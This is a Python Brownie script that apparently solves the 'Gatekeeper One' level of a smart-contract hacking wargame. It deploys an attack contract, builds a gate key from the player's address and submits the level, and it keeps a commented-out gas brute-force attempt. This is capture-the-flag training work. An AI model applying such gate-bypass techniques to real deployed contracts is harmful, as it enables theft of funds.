from brownie import web3, network, GatekeeperOne, GatekeeperOneAttack

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "13_gatekeeper_one"
INTERFACE_CONTRACT = GatekeeperOne
INSTANCE_VALUE_WEI = web3.toWei(0, "ether")


def solve_level(level_contract):
    account = get_account()
    gatekeeperone_attack = GatekeeperOneAttack.deploy(
        level_contract.address, {"from": account}
    )
    print(account.address)
    gateKey = "0x100000000000" + account.address[38:42]
    print(gateKey)
    tx = gatekeeperone_attack.testGateThree(gateKey)
    # tx = network.transaction.TransactionReceipt

    """
    gateKey = "0x1122334455667788"
    tx = gatekeeperone_attack.tempFunction()
    try:
        tx = gatekeeperone_attack.bruteForceGas(
            gateKey, 5000, {"from": account, "allow_revert": True}
        )
    except:
        print("Something else went wrong")
    finally:
        print(network.history[-1].call_trace(True))
        print("The 'try except' is finished")
        """


# brownie run scripts/_13_gatekeeper_one.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
